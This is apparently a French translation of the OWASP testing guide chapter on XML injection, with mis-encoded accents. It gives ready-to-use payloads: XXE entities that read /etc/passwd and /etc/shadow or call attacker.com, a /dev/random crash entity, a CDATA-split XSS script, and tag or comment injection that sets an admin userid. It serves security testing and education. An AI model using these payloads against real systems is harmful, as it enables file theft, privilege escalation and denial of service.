# Test pour l'injection XML

|ID          |
|------------|
|WSTG-INPV-07|

## Sommaire

Le test d'injection XML se produit lorsqu'un testeur tente d'injecter un document XML dans l'application. Si l'analyseur XML ne parvient pas � valider contextuellement les donn�es, le test donnera un r�sultat positif.

Cette section d�crit des exemples pratiques d'injection XML. Dans un premier temps, une communication de style XML sera d�finie et ses principes de fonctionnement expliqu�s. Ensuite, la m�thode de d�couverte dans laquelle on essaie d'ins�rer des m�tacaract�res XML. Une fois la premi�re �tape accomplie, le testeur disposera de quelques informations sur la structure XML, il sera donc possible d'essayer d'injecter des donn�es et des balises XML (Tag Injection).

## Objectifs des tests

- Identifier les points d'injection XML.
- �valuer les types d'exploits pouvant �tre atteints et leur gravit�.

## Comment tester

Supposons qu'il existe une application Web utilisant une communication de style XML afin d'effectuer l'enregistrement des utilisateurs. Cela se fait en cr�ant et en ajoutant un nouveau n�ud `user>` dans un fichier `xmlDb`.

Supposons que le fichier xmlDB ressemble � ceci�:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
    <user>
        <username>gandalf</username>
        <password>!c3</password>
        <userid>0</userid>
        <mail>gandalf@middleearth.com</mail>
    </user>
    <user>
        <username>Stefan0</username>
        <password>w1s3c</password>
        <userid>500</userid>
        <mail>Stefan0@whysec.hmm</mail>
    </user>
</users>
```

Lorsqu'un utilisateur s'enregistre en remplissant un formulaire HTML, l'application re�oit les donn�es de l'utilisateur dans une requ�te standard, qui, par souci de simplicit�, sera cens�e �tre envoy�e sous la forme d'une requ�te `GET`.

Par exemple, les valeurs suivantes�:

```txt
Username: tony
Password: Un6R34kb!e
E-mail: s4tan@hell.com
```

produira la requ�te�:

`http://www.example.com/addUser.php?username=tony&password=Un6R34kb!e&email=s4tan@hell.com`

L'application construit alors le n�ud suivant�:

```xml
<user>
    <username>tony</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
</user>
```

qui sera ajout� � la xmlDB�:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
    <user>
        <username>gandalf</username>
        <password>!c3</password>
        <userid>0</userid>
        <mail>gandalf@middleearth.com</mail>
    </user>
    <user>
        <username>Stefan0</username>
        <password>w1s3c</password>
        <userid>500</userid>
        <mail>Stefan0@whysec.hmm</mail>
    </user>
    <user>
    <username>tony</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
    </user>
</users>
```

### D�couverte

La premi�re �tape pour tester une application pour la pr�sence d'une vuln�rabilit� XML Injection consiste � essayer d'ins�rer des m�tacaract�res XML.

Les m�tacaract�res XML sont�:

- Guillemet simple�: `'` - Lorsqu'il n'est pas nettoy�, ce caract�re peut g�n�rer une exception lors de l'analyse XML, si la valeur inject�e va faire partie d'une valeur d'attribut dans une balise.

Par exemple, supposons qu'il existe l'attribut suivant�:

`<node attrib='$inputValue'/>`

Alors, si :

`inputValue = foo'`

est instanci� puis ins�r� en tant que valeur d'attribut�:

`<node attrib='foo''/>`

alors, le document XML r�sultant n'est pas bien form�.

- Guillemet double�: `"` - ce caract�re a la m�me signification que le guillemet simple et peut �tre utilis� si la valeur de l'attribut est entour�e de guillemets doubles.

`<node attrib="$inputValue"/>`

Alors, si :

`$inputValue = foo"`

la substitution donne :

`<node attrib="foo""/>`

et le document XML r�sultant n'est pas valide.

- Parenth�ses angulaires�: `>` et `<` - En ajoutant une parenth�se angulaire ouverte ou ferm�e dans une entr�e utilisateur comme suit�:

`Username = foo<`

l'application construira un nouveau n�ud�:

```xml
<user>
    <username>foo<</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
</user>
```

mais, � cause de la pr�sence du '<' ouvert, le document XML r�sultant n'est pas valide.

- Balise de commentaire�: `<!--/-->` - Cette s�quence de caract�res est interpr�t�e comme le d�but/la fin d'un commentaire. Donc en injectant l'un d'eux dans le param�tre Username :

`Username = foo<!--`

l'application construira un n�ud comme celui-ci�:

```xml
<user>
    <username>foo<!--</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
</user>
```

qui ne sera pas une s�quence XML valide.

- Esperluette�: `&`- L'esperluette est utilis�e dans la syntaxe XML pour repr�senter des entit�s. Le format d'une entit� est `&symbol;`. Une entit� est mapp�e � un caract�re du jeu de caract�res Unicode.

Par exemple:

`<tagnode>&lt;</tagnode>`

est bien form� et valide, et repr�sente le caract�re ASCII `<`.

Si `&` n'est pas lui-m�me encod� avec `&amp;`, il pourrait �tre utilis� pour tester l'injection XML.

En fait, si une entr�e comme celle-ci est fournie�:

`Username = &foo`

un nouveau n�ud sera cr��:

```xml
<user>
    <username>&foo</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
</user>
```

mais, encore une fois, le document n'est pas valide�: `&foo` ne se termine pas par `;` et l'entit� `&foo;` n'est pas d�finie.

- D�limiteurs de section CDATA : `<!\[CDATA\[ / ]]>` - Les sections CDATA sont utilis�es pour �chapper des blocs de texte contenant des caract�res qui seraient autrement reconnus comme du balisage. En d'autres termes, les caract�res inclus dans une section CDATA ne sont pas analys�s par un analyseur XML.

Par exemple, s'il est n�cessaire de repr�senter la cha�ne `<foo>` � l'int�rieur d'un n�ud de texte, une section CDATA peut �tre utilis�e�:

```xml
<node>
    <![CDATA[<foo>]]>
</node>
```

de sorte que `<foo>` ne sera pas analys� comme un balisage et sera consid�r� comme une donn�e de caract�re.

Si un n�ud est cr�� de la mani�re suivante�:

`<username><![CDATA[<$userName]]></username>`

le testeur pourrait essayer d'injecter la cha�ne CDATA de fin `]]>` afin d'essayer d'invalider le document XML.

`userName = ]]>`

cela deviendra :

`<username><![CDATA[]]>]]></username>`

qui n'est pas un fragment XML valide.

Un autre test est li� � la balise CDATA. Supposons que le document XML est trait� pour g�n�rer une page HTML. Dans ce cas, les d�limiteurs de section CDATA peuvent �tre simplement �limin�s, sans inspecter davantage leur contenu. Ensuite, il est possible d'injecter des balises HTML, qui seront incluses dans la page g�n�r�e, en contournant compl�tement les routines de nettoyage existantes.

Prenons un exemple concret. Supposons que nous ayons un n�ud contenant du texte qui sera affich� � l'utilisateur.

```xml
<html>
    $HTMLCode
</html>
```

Ensuite, un attaquant peut fournir l'entr�e suivante�:

`$HTMLCode = <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>`

et obtenir le n�ud suivant�:

```xml
<html>
    <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>
</html>
```

Lors du traitement, les d�limiteurs de section CDATA sont �limin�s, g�n�rant le code HTML suivant�:

```html
<script>
    alert('XSS')
</script>
```

Le r�sultat est que l'application est vuln�rable � XSS.

Entit� externe�: l'ensemble des entit�s valides peut �tre �tendu en d�finissant de nouvelles entit�s. Si la d�finition d'une entit� est un URI, l'entit� est appel�e une entit� externe. Sauf configuration contraire, les entit�s externes forcent l'analyseur XML � acc�der � la ressource sp�cifi�e par l'URI, par exemple, un fichier sur la machine locale ou sur un syst�me distant. Ce comportement expose l'application aux attaques XML eXternal Entity (XXE), qui peuvent �tre utilis�es pour effectuer un d�ni de service du syst�me local, obtenir un acc�s non autoris� aux fichiers sur la machine locale, analyser des machines distantes et effectuer un d�ni de service de syst�mes distants. .

Pour tester les vuln�rabilit�s XXE, on peut utiliser l'entr�e suivante�:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///dev/random" >]>
        <foo>&xxe;</foo>
```

Ce test peut planter le serveur Web (sur un syst�me UNIX) si l'analyseur XML tente de remplacer l'entit� par le contenu du fichier /dev/random.

D'autres tests utiles sont les suivants :

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>

<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>

<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>

<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" >]><foo>&xxe;</foo>
```

###�Injection de balises

Une fois la premi�re �tape accomplie, le testeur disposera de quelques informations sur la structure du document XML. Ensuite, il est possible d'essayer d'injecter des donn�es et des balises XML. Nous montrerons un exemple de la fa�on dont cela peut conduire � une attaque par escalade de privil�ges.

Consid�rons l'application pr�c�dente. En ins�rant les valeurs suivantes�:

```txt
Username: tony
Password: Un6R34kb!e
E-mail: s4tan@hell.com</mail><userid>0</userid><mail>s4tan@hell.com
```

l'application construira un nouveau n�ud et l'ajoutera � la base de donn�es XML�:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
    <user>
        <username>gandalf</username>
        <password>!c3</password>
        <userid>0</userid>
        <mail>gandalf@middleearth.com</mail>
    </user>
    <user>
        <username>Stefan0</username>
        <password>w1s3c</password>
        <userid>500</userid>
        <mail>Stefan0@whysec.hmm</mail>
    </user>
    <user>
        <username>tony</username>
        <password>Un6R34kb!e</password>
        <userid>500</userid>
        <mail>s4tan@hell.com</mail>
        <userid>0</userid>
        <mail>s4tan@hell.com</mail>
    </user>
</users>
```

Le fichier XML r�sultant est bien form�. De plus, il est probable que, pour l'utilisateur tony, la valeur associ�e � la balise userid soit celle apparaissant en dernier, c'est-�-dire 0 (l'ID administrateur). En d'autres termes, nous avons inject� un utilisateur avec des privil�ges administratifs.

Le seul probl�me est que la balise userid appara�t deux fois dans le dernier n�ud utilisateur. Souvent, les documents XML sont associ�s � un sch�ma ou � une DTD et seront rejet�s s'ils ne s'y conforment pas.

Supposons que le document XML est sp�cifi� par la DTD suivante�:

```xml
<!DOCTYPE users [
    <!ELEMENT users (user+) >
    <!ELEMENT user (username,password,userid,mail+) >
    <!ELEMENT username (#PCDATA) >
    <!ELEMENT password (#PCDATA) >
    <!ELEMENT userid (#PCDATA) >
    <!ELEMENT mail (#PCDATA) >
]>
```

Notez que le n�ud userid est d�fini avec la cardinalit� 1. Dans ce cas, l'attaque que nous avons montr�e pr�c�demment (et d'autres attaques simples) ne fonctionnera pas si le document XML est valid� par rapport � sa DTD avant tout traitement.

Cependant, ce probl�me peut �tre r�solu, si le testeur contr�le la valeur de certains n�uds pr�c�dant le n�ud incrimin� (userid, dans cet exemple). En fait, le testeur peut commenter un tel n�ud, en injectant une s�quence de d�but/fin de commentaire�:

```txt
Username: tony
Password: Un6R34kb!e</password><!--
E-mail: --><userid>0</userid><mail>s4tan@hell.com
```

Dans ce cas, la base de donn�es XML finale est�:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
    <user>
        <username>gandalf</username>
        <password>!c3</password>
        <userid>0</userid>
        <mail>gandalf@middleearth.com</mail>
    </user>
    <user>
        <username>Stefan0</username>
        <password>w1s3c</password>
        <userid>500</userid>
        <mail>Stefan0@whysec.hmm</mail>
    </user>
    <user>
        <username>tony</username>
        <password>Un6R34kb!e</password><!--</password>
        <userid>500</userid>
        <mail>--><userid>0</userid><mail>s4tan@hell.com</mail>
    </user>
</users>
```

Le n�ud original `userid` a �t� comment�, ne laissant que celui inject�. Le document est d�sormais conforme � ses r�gles DTD.

## Examen du code source

L'API Java suivante peut �tre vuln�rable � XXE si elle n'est pas configur�e correctement.

```text
javax.xml.parsers.DocumentBuilder
javax.xml.parsers.DocumentBuildFactory
org.xml.sax.EntityResolver
org.dom4j.*
javax.xml.parsers.SAXParser
javax.xml.parsers.SAXParserFactory
TransformerFactory
SAXReader
DocumentHelper
SAXBuilder
SAXParserFactory
XMLReaderFactory
XMLInputFactory
SchemaFactory
DocumentBuilderFactoryImpl
SAXTransformerFactory
DocumentBuilderFactoryImpl
XMLReader
Xerces: DOMParser, DOMParserImpl, SAXParser, XMLParser
```

V�rifiez le code source si les entit�s docType, DTD externe et param�tre externe sont d�finies comme des utilisations interdites.

- [Aide-m�moire sur la pr�vention des entit�s externes XML (XXE)](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

De plus, le lecteur Java POI office peut �tre vuln�rable � XXE si la version est inf�rieure � 3.10.1.

La version de la biblioth�que POI peut �tre identifi�e � partir du nom de fichier du JAR. Par exemple,

- `poi-3.8.jar`
- `poi-ooxml-3.8.jar`

Le mot cl� de code source suivant peut s'appliquer � C.

- libxml2�: xmlCtxtReadMemory, xmlCtxtUseOptions, xmlParseInNodeContext, xmlReadDoc, xmlReadFd, xmlReadFile, xmlReadIO, xmlReadMemory, xmlCtxtReadDoc, xmlCtxtReadFd, xmlCtxtReadFile, xmlCtxtReadIO
- libxerces-c�: XercesDOMParser, SAXParser, SAX2XMLReader

## Outils

- [Cha�nes Fuzz d'injection XML (de l'outil wfuzz)] (https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/XML.txt)

## R�f�rences

- [Injection XML](https://www.whitehatsec.com/glossary/content/xml-injection)
- [Gregory Steuck, "attaque XXE (Xml eXternal Entity)"](https://www.securityfocus.com/archive/1/297714)
- [Aide-m�moire de pr�vention OWASP XXE] (https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
